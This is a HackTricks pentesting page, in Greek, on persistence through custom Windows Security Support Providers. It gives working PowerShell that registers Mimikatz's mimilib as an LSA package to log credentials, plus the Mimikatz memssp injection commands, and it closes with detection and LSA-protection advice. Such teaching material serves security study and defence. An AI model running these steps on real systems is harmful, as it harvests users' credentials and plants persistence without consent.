# Custom Security Support Providers

{{#include ../../banners/hacktricks-training.md}}

Οι [Security Support Providers (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) είναι security packages βασισμένα σε DLL, τα οποία φορτώνονται από το Local Security Authority (LSA). Τα Windows καταχωρίζουν custom SSP/AP DLLs μέσω της τιμής `REG_MULTI_SZ` `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` και φορτώνουν τα καταχωρισμένα packages κατά την εκκίνηση του συστήματος.<sup>[[1]](#references)</sup>

Επειδή τα SSPs εκτελούνται στο LSA και μπορούν να λαμβάνουν credentials, οι adversaries ενδέχεται να κάνουν abuse ενός malicious package για credential access και persistence. Το MITRE παρακολουθεί αυτήν τη συμπεριφορά ως T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Το Mimikatz περιλαμβάνει το `mimilib.dll`, το οποίο υλοποιεί ένα SSP που καταγράφει τα credentials που διαχειρίζεται μετά τη φόρτωσή του. Σε ένα authorized lab, τοποθετήστε το DLL που αντιστοιχεί στην αρχιτεκτονική του target στη θέση `C:\Windows\System32` και, στη συνέχεια, ελέγξτε την τρέχουσα λίστα packages πριν την αλλάξετε.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
Μια τυπική υπάρχουσα τιμή μπορεί να περιέχει πακέτα όπως `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` και `pku2u`. Διατηρήστε κάθε υπάρχουσα καταχώριση κατά την προσθήκη του custom package.<sup>[[1]](#references)</sup>

Προσθέστε στο τέλος το `mimilib` χωρίς να αντικαταστήσετε τα υπάρχοντα πακέτα:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Μετά από επανεκκίνηση, το package φορτώνεται στο LSA και τα credentials που καταγράφονται στη συνέχεια εγγράφονται στο `C:\Windows\System32\kiwissp.log` από αυτή την υλοποίηση.<sup>[[2]](#references)[[3]](#references)</sup>

## Φόρτωση στη μνήμη

Το Mimikatz μπορεί επίσης να εισαγάγει την υλοποίηση SSP στη running διεργασία LSASS:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Αυτή η method δεν παραμένει ενεργή μετά από επανεκκίνηση.<sup>[[2]](#references)[[3]](#references)</sup>

## Detection and Mitigation

Παρακολουθήστε τις αλλαγές στο `...\Lsa\Security Packages` και τις μη αναμενόμενες φορτώσεις DLL στο `lsass.exe`. Το event ασφαλείας 4657 καταγράφει τροποποίηση **value** στο registry μόνο όταν έχουν ρυθμιστεί η σχετική πολιτική Audit Registry και το SACL.<sup>[[2]](#references)[[4]](#references)</sup>

Όπου είναι συμβατό, ενεργοποιήστε την added LSA protection και διερευνήστε μη υπογεγραμμένα ή μη αναμενόμενα SSP DLLs. Η Microsoft τεκμηριώνει την LSA protection συγκεκριμένα ως μέτρο ελέγχου κατά του code injection που θα μπορούσε να θέσει σε κίνδυνο credentials.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Εγγραφή SSP/AP DLLs](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Αποθετήριο Mimikatz - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Event ασφαλείας 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Ρύθμιση πρόσθετης LSA protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
